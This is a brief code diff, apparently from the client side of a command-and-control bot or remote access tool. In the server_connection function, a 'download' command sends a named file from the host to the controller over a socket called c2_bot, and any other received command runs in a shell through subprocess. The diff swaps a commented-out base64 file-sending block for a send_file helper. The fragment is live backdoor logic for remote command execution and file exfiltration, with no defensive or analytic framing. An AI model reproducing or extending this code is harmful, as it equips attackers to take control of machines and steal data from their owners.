@@ -69,14 +69,6 @@ def server_connection(ip, ports):
                 if "download" in command:
                     file_name = command.split(" ")[1]
                     command = command.split(" ")[0]
-                    # print(file_name)
-                    # try:
-                    #     with open(file_name, "rb") as f:
-                    #         data = f.read()
-                    #         data = base64_encode(data)
-                    #         c2_bot.sendall(data)
-                    # except:
-                    #     c2_bot.sendall(base64_encode(b"[-] File not found"))
                     send_file(c2_bot, file_name)
                 else:
                     result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
